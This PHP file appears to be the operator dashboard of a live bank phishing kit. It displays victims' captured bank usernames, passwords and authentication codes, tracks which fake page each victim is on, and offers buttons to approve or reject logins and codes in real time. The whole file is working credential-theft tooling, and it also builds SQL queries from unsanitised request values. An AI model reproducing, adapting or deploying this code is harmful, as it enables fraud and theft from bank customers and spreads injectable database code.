<?php 
include('db.php'); 
include('YH0uW3ecaRHG16ld4waY.php');

if($_GET['delete']=='else'){
    if(isset($_POST['delete'])){
 $cnt=array();
 $cnt=count($_POST['checkbox']);

        for($i=0;$i<$cnt;$i++){
            $del_id=$_POST['checkbox'][$i];
        
        //echo '<script>alert("'.$del_id.'");</script>';
        $sqldel = "DELETE FROM payment WHERE id='$del_id'";
        $con->query($sqldel);
//        echo '<script>window.location.href="payment.php?payment_id="'.$payment_id.'";</script>';
            
        }        
    }
        echo '<script>window.location.href="usrauth.php";</script>';
}




if(isset($_GET['sound'])){
$new1 = $con->query("SELECT * FROM `payment` WHERE `beep` = '1'");
echo $counting = $new1->num_rows;
}else{
?>
      <div class="col-md-12" style="padding: 0px 0px 0px 0px !important" style="overflow:scroll; height:100px;">

        <div class="list-header fill">
          <div class="list-filter clearfix">
           <div class="pull-right">
             <div class="btn-group  list-sorter">

            </div>
            </div>
            <div>

            </div>
          </div>
        </div>
<?php 
if($counting > 0){
?>

<audio id="myAudio">
  <source src="deeg3beep-01a.wav" type="audio/wav">
  <source src="deeg3beep-01a.mp3" type="audio/mpeg">
  Your browser does not support the audio element.
</audio>
<!--<embed src="deeg3beep-01a.wav" autostart="false" width="0" height="0"  enablejavascript="true"> -->
<?php 
//$con->query("UPDATE `payment` SET `beep` = '0' WHERE  `beep` = '1'");
} ?>
        <div id="ember1921" class="scroll-y fill body scrollbox noscroll-x ember-view" style="height: 1000px;padding: 0px 0px 0px 0px ">   
        <div id="ember1922" class="ember-view">
<script>
var x = document.getElementById("myAudio"); 

function playAudio() { 
    x.play(); 
} 

function pauseAudio() { 
    x.pause(); 
} 
playAudio();
</script>
</div>
<form action="usrauth.php?delete=else" method="post">

<div class="pull-right">
<?php
if($session_role=='admin'){
$sqsp1 = "SELECT * FROM `payment` WHERE `block_status` = 'unblocked'";
$newsp1 = $con->query($sqsp1);
}else{
$sqsp11 = "SELECT * FROM `payment` WHERE `block_status` = 'unblocked' AND `company_email` = '$session_email'";
$newsp1 = $con->query($sqsp11);
}
$rowsp1 = $newsp1->fetch_assoc();
$num1 = $newsp1->num_rows;

$sqsp2 = "SELECT * FROM `payment` WHERE  `block_status` = 'unblocked' AND `block_session` = '$session_email'";
$newsp2 = $con->query($sqsp2);
$rowsp2 = $newsp2->fetch_assoc();
$num2 = $newsp2->num_rows;


if($num1!=$num2){
?>
                      <a href="block_unblock.php?session_emails=<?php echo $session_email; ?>&status=blocked&page_name=usrauth.php" class="btn btn-danger"> 
                        <i class="fa fa-lock"></i>&nbsp;block All
                      </a>
<?php }else{ ?>
                      <a href="block_unblock.php?session_emails=<?php echo $session_email; ?>&status=unblocked&page_name=usrauth.php" class="btn btn-success"> 
                        <i class="fa fa-unlock"></i>&nbsp;Unlock All
                      </a>
<?php } ?>

                      <button class="btn btn-danger popovercontainer ember-view" type="submit" name="delete" > 
                        <i class="fa fa-trash"></i>&nbsp;Delete
                      </button>
<br><br>
</div>

<table class="table table-hover zi-table  ember-view" style="overflow-y:scroll;">  
         <thead>
            <tr>
                 <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="Email" class="pull-left over-flow"> Middle Man</div>
                  </th>
                 <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="Email" class="pull-left over-flow"> Login Status</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Trans. Id</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Bank Name</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Status</div>
                  </th>
                 <th style="" id="ember1926" class="sortable text-left ember-view">
                    <div title="Company Name" class="pull-left over-flow"> Login</div>
                  </th>
                 <th style="" id="ember1926" class="sortable text-left ember-view">
                    <div title="Company Name" class="pull-left over-flow"> Password</div>
                  </th>
                 <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="Email" class="pull-left over-flow"> Authentication Code</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Action</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Clone</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Block</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Trash</div>
                  </th>
            </tr>
          </thead>


        <tbody>
<?php 

$con->query("UPDATE `payment` SET `last_login` = `last_login`+'10' WHERE 1");
if($session_role=='admin'){
$sql1 = "SELECT * FROM `payment`";
$new1 = $con->query($sql1);
}else{
$sql1 = "SELECT * FROM `payment` WHERE `break` = 'off' AND `company_email` = '$session_email'";
$new1 = $con->query($sql1);
}
while ($pay = $new1->fetch_assoc()) {
$acode = $pay['code'];
?>
                <tr data-ember-action="" data-ember-action-1946="1946" style="background: <?php if($pay['status'] == 'block'){ echo '#F7B0DB'; }elseif($pay['status'] == 'aproove'){ echo '#9FECAF'; }elseif($pay['status'] == 'login_aproove'){ echo '#FFA500'; }elseif($pay['status'] == 'copy'){ echo '#FFA500'; } ?>">

<td><i class="fa fa-user"></i><?php echo $pay['company_email']; ?></td>
                <td id="ember1961" class="ember-view">
                  <?php if($pay['last_login'] < '11'){ echo '<i class="fa fa-power-off" style="color:green;"></i> Active';}else{ echo '<i class="fa fa-power-off" style="color:red;"></i> '.$pay['last_login'].' Sec ago'; } ?>
                </td>
                <td id="ember1965" class="ember-view">
                    <input type="text" id="id<?php echo $pay['id']; ?>" name="" value="<?php echo "https://".$_SERVER['SERVER_NAME']."/".URL_directory1; ?>index.php?id=<?php echo $pay['id']; ?>" style="width: 10px;" readonly><?php $ids=$pay['id']; ?>
<a onclick="copy('#id<?php echo $ids; ?>');" class="btn btn-primary popovercontainer ember-view"><?php echo $pay['id']; ?></a>

</td>

                <td id="ember1965" class="ember-view">
                  <?php echo $pay['bank_name']; ?>
                </td>

                <td id="ember1965" class="ember-view">
                 <?php if($pay['last_login'] < '11'){ if($pay['page_name']=='index.php'){echo 'Login page'; }elseif(($pay['page_name']=='mtransfer_steptwo.php') || ($pay['page_name']=='indexauth.php')){echo 'Authcode page'; } } ?>
                </td>

                <td id="ember1960" class="ember-view">    
                    <input type="text" id="user<?php echo $ids; ?>" name="" value="<?php echo $pay['bank_user_id']; ?>" style="width: 100px; background:transparent;" onclick="copy('#user<?php echo $ids; ?>');" readonly>
                  
                </td>
                <td id="ember1960" class="ember-view">    
                    <input type="text" id="pass<?php echo $ids; ?>" name="" value="<?php echo $pay['bank_user_password']; ?>" style="width: 100px;  background:transparent;" onclick="copy('#pass<?php echo $ids; ?>');" readonly>
                  
                </td>
                
                <td id="ember1961" class="ember-view">
                    <input type="text" id="pass<?php echo $pay['code']; ?>" name="" value="<?php if($pay['status']=='show'){ echo $pay['code']; } ?>" style="width: 100px;  background:transparent;" onclick="copy('#pass<?php echo $acode; ?>');" readonly>
                  <!--<a id="code<?php echo $pay['code']; ?>" onclick="copy('#code<?php echo $acode; ?>');"><?php if(($pay['status']=='show') || ($pay['status']=='aproove')){ echo $pay['code']; } ?></a>-->
                </td>
                
                <td id="ember1962" class="ember-view">
                  <?php  if($pay['status']=='aproove'){  ?>
                  <button style="background-color: green;padding: 5px 20px 5px 20px;color: white" disabled="">Aprooved</button>
                  <a href="status_payment.php?id=<?php echo $pay['id']; ?>" class="btn btn-primary">Reload</a>
                  <?php }elseif($pay['status']=='block'){}else{ ?>
                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="aproove(<?php echo $pay['id'] ?>)" style="cursor: pointer;" <?php if($pay['status']=='login_aproove'){ echo "checked='checked'"; } ?>>Approve Login
                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="status_aproove(<?php echo $pay['id'] ?>)" <?php if($pay['status']=='aprove'){ echo "checked='checked'"; } ?> style="cursor: pointer;">Approve Code<br>
                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="logoncancel(<?php echo $pay['id'] ?>)" style="cursor: pointer;" <?php if($pay['status']=='login_invalid'){ echo "checked='checked'"; } ?>>Invalid Logins
                  <input id="check" name="status" class="ember-checkbox ember-view" type="radio" onclick="status_cancel(<?php echo $pay['id'] ?>)" style="cursor: pointer;" <?php if($pay['status']=='invalid_code'){ echo "checked='checked'"; } ?>>Invalid Code
                  <?php } ?>
                  <button id="but" style="background-color: green;padding: 5px 20px 5px 20px;color: white;display: none" disabled="">Aprooved</button>
                </td>
                <td id="ember1961" class="ember-view">
                  <a href="pay_copy.php?id=<?php echo $pay['id'];  ?>" style="color:red;"><i class="fa fa-clone"></i></a>
                </td>
                <td id="ember1961" class="ember-view">
                    <?php if($pay['block_status']=='unblocked'){ ?>
                  <a href="pay_block.php?id=<?php echo $pay['id'];  ?>&status=block" style="color:red;"><i class="fa fa-ban"></i></a>
                    <?php } if($pay['block_status']=='block'){ ?>
                  <a href="pay_block.php?id=<?php echo $pay['id'];  ?>&status=unblocked" style="color:green;"><i class="fa fa-unlock"></i></a>
                    <?php } ?>
                </td>
                <td id="ember1961" class="ember-view">
                  <a href="pay_delete.php?id=<?php echo $pay['id'];  ?>&page=usrauth.php" style="color:red;"><i class="fa fa-trash"></i></a>
               &nbsp; <input name="checkbox[]" type="checkbox" value="<?php echo $pay['id']; ?>" style="cursor:pointer">                  
                </td>
            </tr>
<?php }  ?>

        <!----></tbody>
        </table>
</form>    
        
        <div>
        </div>
        </div>     



        <?php } ?>